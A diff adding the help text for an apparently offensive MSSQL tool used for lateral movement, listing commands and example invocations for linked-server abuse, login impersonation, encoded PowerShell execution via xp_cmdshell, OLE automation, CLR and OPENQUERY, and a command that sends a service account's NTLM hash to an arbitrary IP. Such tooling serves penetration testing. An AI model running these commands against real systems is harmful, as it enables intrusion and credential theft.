@@ -1,0 +1,45 @@
+ABOUT
+    MSSQL trust abuse tool for command execution and lateral movement. Supports domain
+    SPN discovery, linked server enumeration, impersonation, xp_cmdshell, OLE automation,
+    CLR assembly abuse, and OPENQUERY execution. Type net-cheese-sql <command> /help for
+    per command argument details.
+
+USAGE:
+    net-cheese-sql --- <command> [options]
+
+EXAMPLES:
+    net-cheese-sql --- findspn
+    net-cheese-sql --- listdb /server:SQL01
+    net-cheese-sql --- getlogin /server:SQL01
+    net-cheese-sql --- getdbuser /server:SQL01 /permissions
+    net-cheese-sql --- getlinked /server:SQL01 /verbose
+    net-cheese-sql --- getserverinfo /server:SQL01
+    net-cheese-sql --- gethash /server:SQL01 /ip:10.10.10.5
+    net-cheese-sql --- xp /server:SQL01 /command:<B64-PWSH>
+    net-cheese-sql --- ole /server:SQL01 /command:<B64-PWSH>
+    net-cheese-sql --- clr /server:SQL01 /command:<B64-PWSH> /compile
+    net-cheese-sql --- rpc /server:SQL01 /target:LINKED01
+    net-cheese-sql --- xpoquery /server:SQL01 /target:LINKED01 /command:<B64-PWSH>
+    net-cheese-sql --- openquery /server:SQL01 /target:LINKED01 /query:"SELECT 1"
+
+COMMANDS:
+    findspn             Find MSSQL instances using domain SPNs
+    listdb              List available databases on the server
+    gethash             Send service account Net NTLM hash to an arbitrary IP
+    getlogin            Retrieve SQL logins available for impersonation
+    getdbuser           Retrieve SQL login, mapped user, and role information
+    getlinked           Retrieve information about linked servers
+    getserverinfo       Retrieve xp_cmdshell, OLE automation, and CLR enabled status
+    xp                  Execute encoded PowerShell via xp_cmdshell
+    ole                 Execute encoded PowerShell via sp_OACreate and sp_OAMethod
+    clr                 Execute encoded PowerShell via custom .NET assemblies
+    rpc                 Configure linked SQL server to allow RPC connections
+    xpoquery            Execute encoded PowerShell on linked server via OPENQUERY
+    openquery           Execute an arbitrary query using OPENQUERY
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    net-cheese-sql -w 60 --- findspn
